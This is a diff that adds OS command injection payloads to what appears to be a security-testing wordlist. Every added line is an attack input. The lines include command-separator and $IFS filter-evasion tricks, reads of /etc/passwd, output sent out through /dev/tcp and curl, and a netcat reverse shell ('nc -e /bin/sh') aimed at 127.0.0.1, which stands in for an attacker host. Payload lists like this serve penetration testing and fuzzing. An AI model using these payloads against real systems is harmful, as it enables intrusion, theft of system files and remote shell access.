@@ -20,3 +20,23 @@ $(cat /etc/passwd)
 &id&
 |id|
 ;ls;
+|| id
+&& id
+;{id}
+$({id})
+%0a id
+%0d id
+%0a%0d id
+;$IFS'id'
+cat$IFS/etc/passwd
+;echo${IFS}test
+X=$(id)&&$X
+eval 'id'
+;id>/dev/tcp/127.0.0.1/80
+;curl http://127.0.0.1/$(id)
+;ping -c1 127.0.0.1
+;nc -e /bin/sh 127.0.0.1 4444
+;/usr/bin/id
+| /bin/cat /etc/passwd
+$(python -c 'import os;os.system("id")')
+;w]ho[ami
